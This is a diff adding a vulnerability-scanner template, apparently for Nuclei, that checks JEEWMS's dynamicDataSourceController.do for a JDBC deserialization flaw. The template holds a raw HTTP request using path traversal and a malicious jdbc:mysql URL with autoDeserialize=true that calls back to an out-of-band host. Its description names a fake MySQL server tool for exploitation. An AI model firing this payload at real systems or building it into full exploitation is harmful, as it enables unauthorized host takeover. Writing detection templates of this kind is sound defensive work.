@@ -1,0 +1,25 @@
+id: jeewms-dynamicdatasourcecontroller-jdbc-deserialization
+
+info:
+  name: JEEWMS dynamicDataSourceController JDBC反序列化漏洞
+  author: onewin
+  severity: critical
+  tags: JeeWMS
+  description: |
+    JEEWMS系统dynamicDataSourceController.do存在JDBC反序列化漏洞，导致攻击者可以获取系统主机权限。利用工具https://github.com/fnmsd/MySQL_Fake_Server
+
+http:
+  - raw:
+      - |+
+        GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
